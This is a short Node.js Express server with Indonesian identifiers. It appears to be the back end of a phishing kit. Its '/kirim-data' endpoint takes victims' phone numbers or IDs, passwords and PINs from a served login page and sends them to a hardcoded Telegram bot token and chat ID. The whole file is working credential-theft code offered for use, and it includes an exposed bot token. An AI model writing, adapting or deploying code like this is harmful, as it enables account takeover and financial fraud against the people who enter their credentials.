require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');

const app = express();
const PORT = 3000;


// Tulis langsung di sini
const BOT_TOKEN = "8639273694:AAGcHEUSVDGCmhMP3hzm7cikK9LqnKjqH_I";
const CHAT_ID = "8810674043";

app.use(express.static('.'));
app.use(bodyParser.json());

app.post('/kirim-data', (req, res) => {
  const { langkah, id, sandi, pin } = req.body;

  let isiPesan = `✅ ${langkah}\n━━━━━━━━━━━━━━━\n📱 Nomor/ID: ${id}\n🔑 Kata Sandi: ${sandi}`;
  if (pin) isiPesan += `\n🔢 PIN: ${pin}`;
  isiPesan += `\n━━━━━━━━━━━━━━━`;

  const pesan = encodeURIComponent(isiPesan);
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;

  https.get(url, (resp) => {
    resp.on('data', () => {});
    resp.on('end', () => res.json({ sukses: true }));
  }).on('error', (err) => {
    console.error('Error:', err.message);
    res.status(500).json({ sukses: false });
  });
});

app.listen(PORT, () => {
  console.log(`✅ Server berjalan di http://localhost:${PORT}`);
});
